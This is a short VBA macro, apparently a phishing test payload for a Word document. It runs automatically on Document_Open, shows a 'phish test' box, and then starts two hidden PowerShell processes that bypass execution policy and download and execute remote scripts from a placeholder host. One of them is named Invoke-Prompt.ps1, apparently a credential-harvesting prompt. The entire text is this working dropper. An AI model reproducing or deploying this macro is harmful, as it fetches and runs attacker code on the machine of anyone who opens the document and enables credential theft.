Private Sub Document_Open()
    MsgBox "phish test", vbOKOnly, "phish test"
    a = Shell("cmd /c start /min powershell -exec bypass iex ((New-Object System.Net.WebClient).DownloadString('http://x.x.x.x/Invoke-Prompt.ps1'))", vbHide)
    b = Shell("cmd /c start /min powershell -exec bypass iex ((New-Object System.Net.WebClient).DownloadString('http://x.x.x.x/e.ps1'))", vbHide)
End Sub
